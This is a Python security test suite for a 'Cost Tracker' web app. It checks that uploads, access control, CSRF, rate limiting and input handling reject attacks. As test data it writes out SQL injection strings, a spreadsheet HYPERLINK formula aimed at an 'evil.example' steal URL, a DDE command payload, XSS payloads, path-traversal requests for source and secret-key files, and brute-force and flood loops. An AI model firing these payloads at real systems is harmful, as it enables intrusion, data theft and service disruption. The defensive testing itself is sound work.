"""Security tests for Cost Tracker. Uses only safe, made-up test data and only talks to the app you point it at.

    BASE_URL=http://127.0.0.1:5000 python tests/security_tests.py [--only ST-03] [--json out.json]
Each test prints PASS or FAIL with the evidence it observed.
"""
import http.client, io, json, os, random, re, string, sys, time, zipfile
from urllib.parse import urlparse
import requests

BASE = os.environ.get("BASE_URL", "http://127.0.0.1:5000").rstrip("/")
RESULTS = []


def rnd(n=6):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def new_user(prefix="user"):
    s = requests.Session()
    s.headers["X-CSRF-Token"] = s.get(BASE + "/api/me").json()["csrf"]
    name = "%s_%s" % (prefix, rnd())
    r = s.post(BASE + "/api/register", json={"username": name, "password": "TestPass-" + rnd(8)})
    assert r.status_code == 200, "register failed %s %s" % (r.status_code, r.text)
    s.headers["X-CSRF-Token"] = r.json()["csrf"]
    s.username = name
    return s


def record(tid, name, expected, observed, passed):
    RESULTS.append({"id": tid, "name": name, "expected": expected, "observed": observed, "passed": bool(passed)})
    print("[%s] %s  %s\n      expected: %s\n      observed: %s" % ("PASS" if passed else "FAIL", tid, name, expected, observed))


def upload(s, pid, filename, data, mode="append"):
    return s.post("%s/api/projects/%d/import" % (BASE, pid), files={"file": (filename, data)}, data={"mode": mode})


def mkproject(s, name="Test project"):
    return s.post(BASE + "/api/projects", json={"name": name, "currency": "Rs.", "contingency_pct": 10}).json()["id"]


def st01_uploads():
    s = new_user("up"); pid = mkproject(s)
    zip_nowb = io.BytesIO()
    with zipfile.ZipFile(zip_nowb, "w") as z:
        z.writestr("hello.txt", "x")
    cases = [
        ("program.exe (MZ header)", "program.exe", b"MZ\x90\x00" + b"\x00" * 100),
        ("text renamed to .xlsx", "budget.xlsx", b"this is not a workbook"),
        ("zip without workbook.xml as .xlsx", "budget.xlsx", zip_nowb.getvalue()),
        ("3 MB CSV (over 2 MB limit)", "big.csv", b"Item,Estimated\n" + b"a,1\n" * (3 * 1024 * 1024 // 4)),
        ("binary data named .csv", "data.csv", b"\x00\x01\x02binary" * 50),
        ("double extension .csv.exe", "report.csv.exe", b"Item,Estimated\nA,1\n"),
        ("empty file", "empty.csv", b""),
    ]
    out, ok = [], True
    for label, fn, data in cases:
        r = upload(s, pid, fn, data)
        rejected = r.status_code in (400, 413)
        ok &= rejected
        out.append("%s -> HTTP %d" % (label, r.status_code))
    good = upload(s, pid, "good.csv", b"Category,Item,Cost type,Estimated,Actual\nHW,Drive,Cash,14000,13500\n")
    ok &= good.status_code == 200
    out.append("valid CSV (control) -> HTTP %d" % good.status_code)
    record("ST-01", "Invalid file uploads", "all 7 bad files rejected (400/413), valid CSV accepted (200)", "; ".join(out), ok)


def st02_access():
    a, b = new_user("alice"), new_user("bob")
    pid = mkproject(a, "Alice private budget")
    a.post("%s/api/projects/%d/items" % (BASE, pid), json={"category": "X", "item": "Secret item", "estimated": 100})
    items = a.get("%s/api/projects/%d/analysis" % (BASE, pid)).json()["rows"]; iid = items[0]["id"]
    P = "%s/api/projects/%d" % (BASE, pid)
    attempts = [
        ("GET analysis", b.get(P + "/analysis")), ("GET AI analysis", b.get(P + "/ai")),
        ("GET PDF report", b.get(P + "/report.pdf")), ("GET Excel report", b.get(P + "/report.xlsx")),
        ("POST add item", b.post(P + "/items", json={"category": "X", "item": "evil", "estimated": 1})),
        ("PUT edit item", b.put("%s/items/%d" % (P, iid), json={"category": "X", "item": "hacked", "estimated": 1})),
        ("DELETE item", b.delete("%s/items/%d" % (P, iid))),
        ("POST import", upload(b, pid, "x.csv", b"Item,Estimated\nA,1\n")),
        ("PUT project", b.put(P, json={"name": "hacked", "currency": "Rs.", "contingency_pct": 1})),
        ("DELETE project", b.delete(P)),
    ]
    codes = ["%s=%d" % (n, r.status_code) for n, r in attempts]
    leaked = any("Secret item" in r.text or "Alice private" in r.text for _, r in attempts)
    intact = a.get(P + "/analysis").json()
    unchanged = intact["project"]["name"] == "Alice private budget" and intact["rows"][0]["item"] == "Secret item"
    ok = all(r.status_code == 404 for _, r in attempts) and not leaked and unchanged
    record("ST-02a", "Unauthorized project access (another logged-in user, project id guessed)",
           "every request returns 404, no data leaked, Alice's data unchanged",
           "; ".join(codes) + "; leaked=%s; alice_data_unchanged=%s" % (leaked, unchanged), ok)

    anon = requests.Session()
    c1 = anon.get(BASE + "/api/projects").status_code
    c2 = anon.get(P + "/analysis").status_code
    tok = anon.get(BASE + "/api/me").json()["csrf"]
    c3 = anon.post(BASE + "/api/login", json={"username": "x", "password": "y"}).status_code  # no csrf header
    forged = requests.Session(); forged.get(BASE + "/api/me")
    c4 = forged.post(BASE + "/api/projects", json={"name": "x"}, headers={"X-CSRF-Token": "forged"}).status_code
    no_csrf = a.post(BASE + "/api/projects", json={"name": "x"}, headers={"X-CSRF-Token": ""}).status_code
    t = requests.Session(); t.cookies.set("session", "tampered.cookie.value")
    c5 = t.get(BASE + "/api/projects").status_code
    ok = (c1, c2) == (401, 401) and c3 == 403 and c4 == 403 and no_csrf == 403 and c5 == 401
    record("ST-02b", "No login, missing/forged CSRF token, tampered session cookie",
           "401 without login; 403 without a valid CSRF token; 401 for a tampered cookie",
           "no login list=%d, no login analysis=%d, login without CSRF=%d, forged CSRF=%d, empty CSRF (logged in)=%d, tampered cookie=%d" % (c1, c2, c3, c4, no_csrf, c5), ok)


def st03_brute_force():
    name = "victim_" + rnd()
    s = requests.Session(); tok = s.get(BASE + "/api/me").json()["csrf"]; s.headers["X-CSRF-Token"] = tok
    r = s.post(BASE + "/api/register", json={"username": name, "password": "RealPassword-123"})
    s.headers["X-CSRF-Token"] = r.json()["csrf"]; s.post(BASE + "/api/logout")
    s.headers["X-CSRF-Token"] = s.get(BASE + "/api/me").json()["csrf"]
    codes = []
    for i in range(12):
        codes.append(s.post(BASE + "/api/login", json={"username": name, "password": "guess%d" % i}).status_code)
    correct = s.post(BASE + "/api/login", json={"username": name, "password": "RealPassword-123"})
    retry = correct.headers.get("Retry-After")
    ok = 429 in codes and codes.index(429) <= 6 and correct.status_code == 429
    record("ST-03a", "Login brute force (12 wrong passwords for one username, then the correct one)",
           "attempts are blocked with 429 after a few failures, even the correct password is refused while blocked",
           "wrong-password statuses=%s; correct password afterwards=%d; Retry-After=%s" % (codes, correct.status_code, retry), ok)


def st03_flood():
    s = requests.Session(); s.get(BASE + "/api/me")
    codes = {}
    first_429 = None
    t0 = time.time()
    for i in range(600):
        c = s.get(BASE + "/api/me").status_code
        codes[c] = codes.get(c, 0) + 1
        if c == 429 and first_429 is None:
            first_429 = i + 1
    el = time.time() - t0
    ok = codes.get(429, 0) > 0
    record("ST-03b", "Excessive requests (600 rapid requests from one client)",
           "the server starts answering 429 Too Many Requests",
           "status counts=%s; first 429 at request #%s; %.1f s" % (codes, first_429, el), ok)


def st04_sqli():
    s = new_user("sqli")
    r1 = requests.Session(); r1.headers["X-CSRF-Token"] = r1.get(BASE + "/api/me").json()["csrf"]
    login = r1.post(BASE + "/api/login", json={"username": "admin' OR '1'='1' --", "password": "x' OR '1'='1"})
    reg = r1.post(BASE + "/api/register", json={"username": "bad'; DROP TABLE users;--", "password": "LongEnough-1"})
    pid = mkproject(s)
    payload = "x'); DROP TABLE items;--"
    add = s.post("%s/api/projects/%d/items" % (BASE, pid), json={"category": "' OR 1=1 --", "item": payload, "estimated": 5})
    data = s.get("%s/api/projects/%d/analysis" % (BASE, pid))
    rows = data.json()["rows"] if data.status_code == 200 else []
    stored = any(r["item"] == payload for r in rows)
    alive = s.get(BASE + "/api/projects").status_code == 200
    ok = login.status_code == 401 and reg.status_code == 400 and add.status_code == 201 and stored and alive
    record("ST-04", "SQL injection strings in login, username and item fields",
           "login refused (401), odd username refused (400), payload stored as plain text, tables still work",
           "login=%d; register=%d; add item=%d; stored literally=%s; app/database still working=%s" % (login.status_code, reg.status_code, add.status_code, stored, alive), ok)


def st05_formula():
    s = new_user("fx"); pid = mkproject(s)
    names = ['=HYPERLINK("http://evil.example/steal","Click")', "+cmd|' /C calc'!A0", "@SUM(1+1)", "-2+3"]
    for n in names:
        s.post("%s/api/projects/%d/items" % (BASE, pid), json={"category": "=1+1", "item": n, "estimated": 1, "actual": 2})
    r = s.get("%s/api/projects/%d/report.xlsx" % (BASE, pid))
    z = zipfile.ZipFile(io.BytesIO(r.content))
    xml = z.read("xl/worksheets/sheet1.xml").decode()
    text_formula_cells = re.findall(r'<c r="[ABC]\d+"[^>]*>\s*<f>', xml)
    import openpyxl
    wb = openpyxl.load_workbook(io.BytesIO(r.content))
    ws = wb["Cost data"]
    kept = [ws["B%d" % i].value for i in range(2, 6)]
    types = [ws["B%d" % i].data_type for i in range(2, 6)]
    ok = not text_formula_cells and all(t == "s" for t in types) and kept == names
    record("ST-05", "Formula injection through item names (=HYPERLINK, +cmd, @SUM) into the Excel report",
           "the dangerous text is stored as plain text, never as a formula, and is not altered",
           "formula cells found in text columns=%d; cell types=%s; text preserved=%s" % (len(text_formula_cells), types, kept == names), ok)


def st06_traversal():
    host = urlparse(BASE)
    res = []
    for path in ["/sample/..%2fapp.py", "/sample/../app.py", "/static/..%2fapp.py", "/sample/%2e%2e%2fsecret.key", "/instance/secret.key"]:
        c = http.client.HTTPConnection(host.hostname, host.port or 80, timeout=5)
        c.request("GET", path); r = c.getresponse(); body = r.read().decode("latin-1")
        leaked = "import " in body and "Flask" in body
        res.append((path, r.status, leaked))
    ok = all(st in (400, 404) and not lk for _, st, lk in res)
    record("ST-06", "Path traversal to read source code or the secret key",
           "404 for every attempt, no source code returned",
           "; ".join("%s -> %d%s" % (p, st, " LEAK" if lk else "") for p, st, lk in res), ok)


def st07_headers_and_validation():
    r = requests.get(BASE + "/")
    need = {"Content-Security-Policy": None, "X-Content-Type-Options": "nosniff", "X-Frame-Options": "DENY", "Referrer-Policy": None}
    missing = [h for h, v in need.items() if h not in r.headers or (v and r.headers[h] != v)]
    s = new_user("val"); pid = mkproject(s); P = "%s/api/projects/%d/items" % (BASE, pid)
    bad = [("1000-character name", {"category": "A", "item": "x" * 1000, "estimated": 1}),
           ("negative amount", {"category": "A", "item": "n", "estimated": -5}),
           ("NaN amount", {"category": "A", "item": "n", "estimated": "NaN"}),
           ("huge amount 1e999", {"category": "A", "item": "n", "estimated": "1e999"}),
           ("text amount", {"category": "A", "item": "n", "estimated": "abc"})]
    codes = [(n, s.post(P, json=j).status_code) for n, j in bad]
    ok = not missing and all(c == 400 for _, c in codes)
    record("ST-07", "Security headers and input validation",
           "CSP, nosniff, frame-deny and referrer headers present; five invalid inputs rejected with 400",
           "missing headers=%s; %s" % (missing or "none", ", ".join("%s=%d" % x for x in codes)), ok)


def st08_xss_browser():
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        record("ST-08", "Stored XSS", "-", "playwright not installed, skipped", False); return
    s = new_user("xss"); pid = mkproject(s, "<b>proj</b>")
    p1 = '<img src=x onerror="window.__xss=1">'
    p2 = "<script>window.__xss=2</script>"
    for n in (p1, p2):
        s.post("%s/api/projects/%d/items" % (BASE, pid), json={"category": "<i>cat</i>", "item": n, "estimated": 10, "actual": 20})
    name = s.username
    with sync_playwright() as p:
        b = p.chromium.launch(); pg = b.new_page()
        dialogs = []; pg.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))
        # reuse the signed-in session cookie of the test user
        cookies = [{"name": c.name, "value": c.value, "url": BASE} for c in s.cookies]
        pg.context.add_cookies(cookies); pg.goto(BASE + "/")
        pg.wait_for_selector("#costTable tbody tr td.cat", timeout=8000)
        pg.click("[data-tab=ai]"); pg.click("#runAi"); pg.wait_for_timeout(800)
        executed = pg.evaluate("window.__xss")
        cell_text = pg.locator("#costTable tbody tr td:nth-child(2)").all_inner_texts()
        imgs = pg.locator("#costTable img, #aiOut img, #aiOut script").count()
        b.close()
    shown_literally = p1 in cell_text and p2 in cell_text
    ok = executed is None and not dialogs and imgs == 0 and shown_literally
    record("ST-08", "Stored XSS: <img onerror> and <script> in item names, category and project name",
           "payload is shown as plain text, nothing executes, no <img>/<script> element is created",
           "script executed=%s; dialogs=%d; injected elements=%d; shown as literal text=%s" % (executed is not None, len(dialogs), imgs, shown_literally), ok)


TESTS = {"ST-01": st01_uploads, "ST-02": st02_access, "ST-04": st04_sqli, "ST-05": st05_formula,
         "ST-06": st06_traversal, "ST-07": st07_headers_and_validation, "ST-08": st08_xss_browser,
         "ST-03a": st03_brute_force, "ST-03b": st03_flood}  # flood last: it blocks this client for a while

if __name__ == "__main__":
    only = sys.argv[sys.argv.index("--only") + 1].split(",") if "--only" in sys.argv else None
    for k, fn in TESTS.items():
        if only is None or k in only or k.split("a")[0].split("b")[0] in (only or []):
            fn()
    passed = sum(r["passed"] for r in RESULTS)
    print("\n%d of %d checks passed" % (passed, len(RESULTS)))
    if "--json" in sys.argv:
        json.dump(RESULTS, open(sys.argv[sys.argv.index("--json") + 1], "w"), indent=1)
    sys.exit(0 if passed == len(RESULTS) else 1)
